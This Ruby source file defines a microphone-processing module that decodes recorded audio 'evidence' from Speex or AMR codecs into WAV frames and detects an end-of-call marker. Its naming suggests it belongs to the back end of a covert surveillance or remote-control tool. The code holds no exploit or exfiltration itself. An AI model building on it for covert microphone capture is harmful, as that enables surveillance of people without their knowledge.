require 'stringio'

require_relative '../libs/amr/amr'
require_relative '../libs/speex/speex'
require_relative '../call_processor'
require_relative 'audio_evidence'

module RCS
module MicProcessing
  extend AudioEvidence

  attr_reader :wav

  def end_call?
    self[:data][:grid_content].bytesize == 4 and self[:data][:grid_content] == "\xff\xff\xff\xff"
  end

  def process
    self[:wav] = []
    return if self[:data][:grid_content].nil?

    codec = :amr if self[:data][:sample_rate] & LOG_AUDIO_AMR == 1
    self[:data][:sample_rate] &= ~LOG_AUDIO_AMR # clear codec bit if set

    codec ||= :speex if self[:data][:sample_rate] == 44100
    codec ||= :speex_mobile if self[:data][:sample_rate] == 8000

    # speex decode
    data = self[:data][:grid_content]
    case codec
      when :speex
        self[:wav] = Speex.get_wav_frames(data, Speex::MODEID_UWB)
      when :speex_mobile
        self[:wav] = Speex.get_wav_frames(data, Speex::MODEID_NB)
      when :amr
        self[:wav] = AMR.get_wav_frames data
    end
  end

  def type
    :mic
  end

end
end # RCS::
